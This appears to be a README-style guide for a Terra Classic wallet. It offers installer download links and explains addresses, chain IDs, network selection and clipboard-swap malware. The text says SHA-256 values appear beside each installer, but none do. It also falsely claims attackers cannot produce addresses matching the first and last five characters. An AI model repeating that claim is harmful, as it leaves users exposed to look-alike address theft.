![Terra Station Wallet](assets/banner-article.png)

# LUNC Addresses, Chain ID and Network Selection

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

A Terra Classic address starts with `terra1` and identifies an account on the chain. The network you are pointed at decides which chain that address is read from, and a wrong setting is one of the few mistakes that shows up as an empty wallet rather than as an error.

## What an address is

An address is derived from a public key, which is derived from your phrase. It is not secret - you share it to receive funds, and it appears in every transaction you send - but it is unforgiving: a wrong character sends funds to an address nobody controls.

Terra Classic addresses start with `terra1`, and are long enough that humans cannot check them reliably. Every wallet shows a shortened form with the middle removed; the copy button is the only safe way to handle the full string.

## What the chain ID is

The chain ID names the network. It is a string your wallet holds rather than something you type, and its current value belongs to the release you are running - read it from the app's network setting or from the explorer you are using, not from an article. A transaction is signed for one chain, so one prepared for Terra Classic cannot silently execute on another network: the mismatch surfaces as a failure rather than as a transfer to the wrong place.

In practice you rarely type a chain ID. The wallet's network setting holds it, and the app displays which network it is reading. When that setting is wrong, balances appear empty rather than wrong, because the network the app is reading does not hold this account's history (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-vs-luna.md).

## The distinction that costs money

| Question | Correct check |
|---|---|
| Is this my address? | Compare the full string with the one in your wallet |
| Is this address on Terra Classic? | Check the network the wallet and explorer are using |
| Will the recipient receive it? | Confirm their address and network match yours |

The third row is the expensive one. An address can be perfectly valid and still be on the wrong network, and a wallet cannot tell you that the recipient's app is pointed somewhere else. The only reliable confirmation is the recipient telling you which network and which address they expect.

## Reading an address safely

1. Copy the full address from the wallet that will receive the funds - never retype it, never take it from a chat message sent to you.
2. Paste it into the sender, then compare the first and last five characters against the source, character by character.
3. Send a small test amount first when the destination is new or the amount is large.
4. Confirm the test arrived before sending the rest.
5. Keep the transaction hash until the recipient confirms receipt (*Using a Terra Classic Explorer*).

The test send is the single habit that turns a catastrophic mistake into an annoying one.

## Where addresses come from, and why they change

A phrase produces the same addresses every time it is restored, on any device, in any compatible wallet. That is why importing elsewhere keeps your delegations: the chain only knows the address. *Recover a Terra Station Wallet with a Seed Phrase* covers restoring, and https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/terra-station-key-or-phrase-import.md covers the key-only case.

A new wallet - a new phrase - gets a new address, and with it a fresh history. There is no way to rename or re-point an address, and no way to merge two.

## Clipboard attacks and look-alike addresses

Addresses are handled by clipboard far more than by typing, and that is what malware targets: code that watches the clipboard and swaps a copied address for one it controls at the moment you paste. The result looks like a normal send with a normal address, and the funds go elsewhere.

Two defences are worth the effort. Compare the pasted address with the source character by character - the first and last five characters catch most swaps, because an attacker cannot choose an address with the same opening and ending. And send a small test amount first when the destination is new or the amount is large, then confirm it arrived before sending the rest.

The wallet cannot detect a clipboard swap, because the address is valid and the transaction is well formed. This is a habit problem, not a software one.

One long-term habit helps more than either check: keep one address per purpose and write it down offline, a receiving address for everyday use and another for holdings you rarely touch. When a send is large, read the destination from that offline note rather than from a chat window, and the swap problem disappears before it starts.

## Common confusions

- **"My address changed after an update."** It did not. Either a different wallet is open or a different phrase was imported; check the wallet list (*Managing Multiple Wallets in Terra Station Wallet*).
- **"The address is valid but the balance is zero."** Usually the wrong network, or an address that has never received anything.
- **"The address has `terra1` so it must be Terra Classic."** What an address starts with is not proof of which network you are reading. The network setting, and the explorer you use, are what settle it.
- **"Memo fields and tags."** Terra Classic sends do not require a memo for ordinary transfers; an exchange deposit may require one, and its absence is the usual cause of an uncredited deposit (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-deposit-not-arrived.md).

## Questions people ask

### Do I need to know my chain ID?

Not to use the wallet - the network setting holds it. You need to understand it to explain why an address that looks right can show nothing, which is the chain being wrong rather than the address.

### Why does the same address show nothing on another network?

This pack documents Terra Classic only, so it makes no claim about address formats elsewhere. What does not change is the mechanism: the network setting decides which chain the app reads, so an address can look right and still show nothing if that setting is wrong.

### Is it safe to share my address?

Yes, for receiving. It reveals your balance and history to anyone who looks it up, which is a privacy consideration rather than a security one. Never share the phrase or private key with anyone.

### What if I send to the wrong address?

A confirmed transfer to an address you do not control cannot be reversed by the wallet or by anyone else. That is why the test send and the character check exist.
